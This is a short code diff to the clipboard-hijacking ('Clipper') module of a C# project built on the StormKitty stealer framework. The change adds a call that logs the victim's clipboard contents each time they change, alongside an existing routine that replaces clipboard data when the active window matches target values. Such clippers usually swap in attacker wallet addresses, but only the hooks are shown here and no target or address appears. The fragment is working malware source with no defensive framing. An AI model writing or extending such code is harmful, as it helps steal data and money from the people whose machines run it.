@@ -1,13 +1,16 @@
 ﻿using StormKitty;
+using System;
 
 namespace Clipper
 {
     internal sealed class EventManager
     {
-        // Start clipper only if active windows contains target values
+        // Make something when clipboard content is changed
         public static void Action()
         {
-            if (Detect()) Clipper.Replace();
+            Logger.SaveClipboard(); // Log string
+            // Start clipper only if active windows contains target values
+            if (Detect()) Buffer.Replace();
         }
 
         // Detect target data in active window
